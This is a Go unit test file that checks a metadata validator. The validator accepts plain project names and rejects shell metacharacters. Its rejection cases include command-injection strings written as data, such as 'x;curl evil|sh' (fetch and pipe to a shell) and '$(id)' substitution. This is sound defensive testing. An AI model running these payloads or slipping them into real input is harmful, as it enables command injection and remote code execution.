package dominio_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/jairoprogramador/vex-engine/internal/ejecucion/dominio"
)

func TestComprobarMetadato_AceptaLosNombresDeVerdad(t *testing.T) {
	for _, valor := range []string{
		"", "test", "vex-demo", "mi-proyecto", "shikigami", "acme", "plataforma", "p1", "sand", "prod",
		"9d8d4777-5707-43b3-a636-d6f8433b7a34", "Equipo_2", "com.acme.pagos", "v1.0.21", strings.Repeat("a", 128),
	} {
		t.Run(valor, func(t *testing.T) {
			require.NoError(t, dominio.ComprobarMetadato("Metadatos.ProjectName", valor))
		})
	}
}

func TestComprobarMetadato_RechazaLoQueElShellInterpretaria(t *testing.T) {
	casos := map[string]string{
		"un espacio":              "mi proyecto",
		"otro comando":            "x;curl evil|sh",
		"una sustitución":         "$(id)",
		"comillas invertidas":     "`id`",
		"una comilla":             "a'b",
		"un salto de línea":       "a\nb",
		"una variable del motor":  "${var.secreto}",
		"una barra":               "a/b",
		"parece una opción":       "-rf",
		"sube de directorio":      "..",
		"empieza por punto":       ".oculto",
		"una tilde":               "camión",
		"un NUL":                  "a\x00b",
		"demasiado largo":         strings.Repeat("a", 129),
		"un comodín":              "a*",
		"una redirección":         "a>b",
		"un ampersand":            "a&b",
		"solo un espacio":         " ",
		"un tabulador intermedio": "a\tb",
	}
	for nombre, valor := range casos {
		t.Run(nombre, func(t *testing.T) {
			err := dominio.ComprobarMetadato("Metadatos.ProjectTeam", valor)

			require.ErrorIs(t, err, dominio.ErrInvalido)
			var invalido *dominio.ParametroInvalidoError
			require.True(t, errors.As(err, &invalido))
			require.Equal(t, "Metadatos.ProjectTeam", invalido.Campo)
			require.Empty(t, invalido.Valor, "el error no repite el valor")
			if len(valor) > 3 {
				require.NotContains(t, err.Error(), valor)
			}
		})
	}
}
